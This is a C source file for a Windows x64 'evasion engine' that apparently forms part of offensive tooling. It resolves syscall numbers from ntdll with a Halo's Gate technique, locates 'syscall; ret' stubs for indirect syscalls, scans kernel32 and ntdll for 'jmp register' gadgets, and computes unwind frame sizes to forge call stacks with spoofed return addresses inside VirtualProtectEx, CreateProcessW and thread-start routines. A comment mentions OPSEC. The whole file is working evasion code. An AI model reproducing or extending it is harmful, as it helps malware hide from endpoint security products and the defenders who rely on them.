#include "engine.h"

// Initialize ASM bridging globals
void* qTableAddr = NULL;
void* qGadgetAddress = NULL;
DWORD qGadgetType = 0;
DWORD qFrameSize = 0;
void* qSavedReg = NULL;
void* qSavedRetAddr = NULL;
void* qActiveMaskAddress = NULL;
void* qThreadBase = NULL;
void* qRtlUserThreadStart = NULL;
DWORD qActiveMaskFrame = 0;
DWORD qThreadBaseFrame = 0;
DWORD qRtlUserThreadStartFrame = 0;

SYSCALL_LIST SyscallList;

// Global masks definition
DYNAMIC_MASK Mask_Memory;
DYNAMIC_MASK Mask_File;
DYNAMIC_MASK Mask_Security;
DYNAMIC_MASK Mask_Worker;

// Required for runtime function entry lookup
typedef PRUNTIME_FUNCTION (NTAPI *fnRtlLookupFunctionEntry)(DWORD64 ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);

// UNWIND structures for stack walking
typedef struct _UNWIND_CODE {
    BYTE CodeOffset;
    BYTE UnwindOp : 4;
    BYTE OpInfo : 4;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, *PUNWIND_INFO;

// Simple hash function for string comparison
DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;
    while (c = (INT)((char)*str++)) dwHash = ((dwHash << 0x5) + dwHash) + c;
    return dwHash;
}

// Scans forward to find valid 'syscall; ret' bytes
PVOID GetNextSyscallInstruction(PVOID pAddress) {
    for (DWORD i = 0; i <= 32; i++) {
        if (*((PBYTE)pAddress + i) == 0x0f && *((PBYTE)pAddress + i + 1) == 0x05 && *((PBYTE)pAddress + i + 2) == 0xc3) {
            return (PVOID)((ULONG_PTR)pAddress + i);
        }
    }
    return NULL;
}

// Extracts the System Service Number (Halo's Gate approach)
DWORD64 GetSSN(PVOID pAddress) {
    if (*((PBYTE)pAddress) == 0x4c && *((PBYTE)pAddress + 3) == 0xb8) return *(DWORD*)((PBYTE)pAddress + 4);
    for (WORD idx = 1; idx <= 32; idx++) {
        if (*((PBYTE)pAddress + idx * 32) == 0x4c && *((PBYTE)pAddress + idx * 32 + 3) == 0xb8)
            return *((PBYTE)pAddress + idx * 32 + 4) - idx;
        if (*((PBYTE)pAddress - idx * 32) == 0x4c && *((PBYTE)pAddress - idx * 32 + 3) == 0xb8)
            return *((PBYTE)pAddress - idx * 32 + 4) + idx;
    }
    return INVALID_SSN;
}

// Calculates the stack frame size of a target function by reading its .pdata
DWORD CalcFrameSize(PVOID pFunc) {
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
    if(!RtlLookup) return DEFAULT_FRAME_SIZE;
    
    DWORD64 ImageBase;
    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pFunc, &ImageBase, NULL);
    if(!pRF) return DEFAULT_FRAME_SIZE;
    
    DWORD totalSize = 0;
    
    while (pRF) {
        PUNWIND_INFO pUI = (PUNWIND_INFO)(ImageBase + pRF->UnwindData);
        for(int i = 0; i < pUI->CountOfCodes; i++) {
            UNWIND_CODE* pCode = &pUI->UnwindCode[i];
            BYTE op = pCode->UnwindOp;
            BYTE info = pCode->OpInfo;
            
            if (op == 0) totalSize += 8;
            else if (op == 1) {
                if (info == 0) { totalSize += (*(USHORT*)&pUI->UnwindCode[i+1]) * 8; i += 1; }
                else { totalSize += *(DWORD*)&pUI->UnwindCode[i+1]; i += 2; }
            } 
            else if (op == 2) totalSize += (info * 8) + 8;
            else if (op == 4) i += 1;
            else if (op == 5) i += 2;
            else if (op == 8) i += 1;
            else if (op == 9) i += 2;
            else if (op == 10) totalSize += (info == 0) ? 40 : 48;
        }
        
        if (pUI->Flags & 0x04) {
            int chainedOffset = (pUI->CountOfCodes + 1) & ~1;
            pRF = (PRUNTIME_FUNCTION)(&pUI->UnwindCode[chainedOffset]);
        } else break;
    }
    if(totalSize % 16 != 0) totalSize = (totalSize + 16) & ~15;
    return totalSize;
}

// Scans a module for 'jmp REG' opcodes to use for stack spoofing
PVOID FindValidGadgetInModule(const char* sModule, DWORD* outType, DWORD minFrameSize, DWORD* actualFrameSize) {
    PVOID pModule = (PVOID)GetModuleHandleA(sModule);
    if (!pModule) return NULL;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & 0x20000020) {
            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + pSection[i].VirtualAddress);
            DWORD dwSize = pSection[i].Misc.VirtualSize;
            
            for (DWORD z = 0; z < dwSize - 2; z++) {
                DWORD currentType = (DWORD)-1;
                
                if (pStart[z] == 0xFF && pStart[z+1] == 0xE3) currentType = 0;
                else if (pStart[z] == 0xFF && pStart[z+1] == 0xE7) currentType = 1;
                else if (pStart[z] == 0xFF && pStart[z+1] == 0xE6) currentType = 2;
                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE4) currentType = 3;
                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE5) currentType = 4;
                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE6) currentType = 5;
                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && pStart[z+2] == 0xE7) currentType = 6;
                
                if (currentType != (DWORD)-1) {
                    PVOID pCandidate = (PVOID)(pStart + z);
                    DWORD frameSize = CalcFrameSize(pCandidate);
                    if (frameSize >= minFrameSize) {
                        *outType = currentType;
                        *actualFrameSize = frameSize;
                        return pCandidate;
                    }
                }
            }
        }
    }
    return NULL;
}

// Scans a function's memory looking for a CALL instruction to use as a spoofed return address.
// Uses RtlLookupFunctionEntry to bound the scan to the exact function body,
// preventing false positives from spilling into adjacent functions.
PVOID SeekReturnAddress(PVOID pBase) {
    if (!pBase) return NULL;

    // Determine the exact function size via .pdata to bound the scan
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");

    DWORD scanLimit = 256; // fallback limit if .pdata lookup fails

    if (RtlLookup) {
        DWORD64 ImageBase;
        PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pBase, &ImageBase, NULL);
        if (pRF) {
            DWORD funcSize = pRF->EndAddress - pRF->BeginAddress;
            PVOID realBegin = (PVOID)(ImageBase + pRF->BeginAddress);
            if (realBegin == pBase)
                scanLimit = (funcSize < 256) ? funcSize : 256;
        }
    }

    PBYTE pBytes = (PBYTE)pBase;

    for (DWORD i = 0; i < scanLimit; i++) {
        // 'CALL QWORD PTR [RIP+offset]' (FF 15) — 6 bytes
        if (i + 6 <= scanLimit && pBytes[i] == 0xFF && pBytes[i+1] == 0x15)
            return (PVOID)(pBytes + i + 6);

        // Relative CALL (E8) — 5 bytes
        if (i + 5 <= scanLimit && pBytes[i] == 0xE8)
            return (PVOID)(pBytes + i + 5);
    }

    // Fallback to the function prologue if no CALL is found.
    // Suboptimal for OPSEC, but ensures the engine doesn't crash.
    return pBase;
}

// Initializes the evasion engine, locates gadgets, masks and parses NTDLL
BOOL InitEngine() {
    PVOID ntdllBase = GetModuleHandleA("ntdll.dll");
    if(!ntdllBase) return FALSE;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    PDWORD pdwFunctions = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfFunctions);
    PDWORD pdwNames = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfNames);
    PWORD pwOrdinals = (PWORD)((PBYTE)ntdllBase + pExport->AddressOfNameOrdinals);
    
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    // HMODULE hKBase = GetModuleHandleA("kernelbase.dll");
    
    // Initialize global spoofing masks dynamically
    Mask_Security.pAddress = SeekReturnAddress(GetProcAddress(hK32, "VirtualProtectEx"));
    Mask_Worker.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "CreateProcessW"));
    Mask_Memory.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "MapViewOfFile"));
    Mask_File.pAddress     = SeekReturnAddress(GetProcAddress(hK32, "MoveFileW"));

    // Calculate exact frame sizes for the masks based on the new Return Addresses
    Mask_Security.dwFrameSize = CalcFrameSize(Mask_Security.pAddress);
    Mask_Worker.dwFrameSize   = CalcFrameSize(Mask_Worker.pAddress);
    Mask_Memory.dwFrameSize   = CalcFrameSize(Mask_Memory.pAddress);
    Mask_File.dwFrameSize     = CalcFrameSize(Mask_File.pAddress);
    
    // Configure Stack Spoofing basis dynamically
    qThreadBase = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(hK32, "BaseThreadInitThunk")));
    qRtlUserThreadStart = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(ntdllBase, "RtlUserThreadStart")));
    
    if(!qThreadBase || !qRtlUserThreadStart) return FALSE;
    
    qThreadBaseFrame = CalcFrameSize(qThreadBase);
    qRtlUserThreadStartFrame = CalcFrameSize(qRtlUserThreadStart);
    
    // Find a valid gadget (fallback to ntdll if kernel32 fails)
    qGadgetAddress = FindValidGadgetInModule("kernel32.dll", &qGadgetType, 0x100, &qFrameSize);
    if (!qGadgetAddress) {
        qGadgetAddress = FindValidGadgetInModule("ntdll.dll", &qGadgetType, 0x100, &qFrameSize);
    }
    if (!qGadgetAddress) return FALSE;
    
    SetTableAddr(SyscallList.Entries, qGadgetAddress, qGadgetType, qFrameSize);
    
    // Resolve Syscalls
    DWORD idx = 0;
    for (WORD i = 0; i < pExport->NumberOfNames; i++) {
        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);
        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];
        
        USHORT prefix = *(USHORT*)pcName;
        if (prefix != 0x744E && prefix != 0x775A) continue; // Filter for 'Nt' or 'Zw'
        
        DWORD64 dwSsn = GetSSN(pAddress);
        if (dwSsn == INVALID_SSN) continue;
        
        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);
        if (!pSyscallRet) continue;
        
        SyscallList.Entries[idx].pAddress = pAddress;
        SyscallList.Entries[idx].dwSsn = dwSsn;
        SyscallList.Entries[idx].pSyscallRet = pSyscallRet;
        SyscallList.Entries[idx].dwHash = djb2((PBYTE)pcName);
        
        idx++;
        if (idx >= 512) break;
    }
    SyscallList.Count = idx;
    return TRUE;
}